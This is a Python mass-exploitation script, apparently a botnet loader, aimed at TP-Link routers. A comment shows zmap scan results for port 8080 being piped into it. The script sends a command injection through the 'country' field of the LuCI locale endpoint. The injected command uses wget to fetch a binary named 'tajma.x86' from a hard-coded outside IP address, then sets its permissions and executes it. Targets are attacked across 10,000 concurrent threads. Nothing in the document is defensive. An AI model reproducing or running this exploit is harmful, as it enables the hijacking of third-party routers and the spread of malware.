import urllib.request
import urllib.error
import fileinput
from io import BytesIO
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
#TP-Link WAN-side | zmap -p8080 --max-sendto-failures=99999999 -q -o- | awk {'print $0":8080"'} | python3 wan.py

cmd2exec = "`wget http://103.174.73.190/tajma.x86 ; chmod 777 tajma.x86 ; ./tajma.x86 tplinkphu`"

def exp(t):
    try:
        req = urllib.request.Request("http://"+t+"/cgi-bin/luci/;stok=/locale?form=country")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        postdata = f"operation=write&country=$(id>"+cmd2exec+")"

        r = urllib.request.urlopen(req, data=bytes(postdata, 'utf-8'), timeout=10)

        if r.status == 200:
            print("200 " + t)
    except Exception as e:
        # print(e)
        pass

with ThreadPoolExecutor(max_workers=10000) as executor:
    for line in fileinput.input():
        t = line.rstrip()
        executor.submit(exp, t)
